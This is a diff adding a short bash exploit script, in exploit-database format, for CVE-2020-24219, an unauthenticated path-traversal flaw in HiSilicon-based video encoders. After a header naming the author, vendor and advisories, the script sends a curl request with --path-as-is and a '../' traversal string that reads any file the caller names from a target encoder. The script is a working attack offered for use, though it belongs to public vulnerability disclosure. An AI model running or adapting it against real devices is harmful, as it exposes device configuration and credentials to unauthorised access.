@@ -1,0 +1,24 @@
+#!/usr/bin/env bash
+
+# Exploit Title: HiSilicon video encoders - unauthenticated file disclosure via path traversal
+# Date: 2020-09-20
+# Exploit Author: Alexei Kojenov
+# Vendor Homepage: https://www.szuray.com/
+# Software Link: N/A
+# Version: up to 1.97
+# Tested on: Linux
+# CVE: CVE-2020-24219
+# Vendors: URayTech
+# Reference: https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/
+# Reference: https://www.kb.cert.org/vuls/id/896979
+
+
+if [ "$#" -ne 2 ]
+then
+  echo "Usage:   $0 <server>[:<port>] <filepath>"
+  echo "Example: $0 1.2.3.4:8086 /box/box.ini"
+  exit 1
+fi
+
+curl -s --path-as-is "http://$1/../../sys/devices/media/13070000.jpgd/../../../..$2" \
+  || echo "ERROR: curl returned $?"
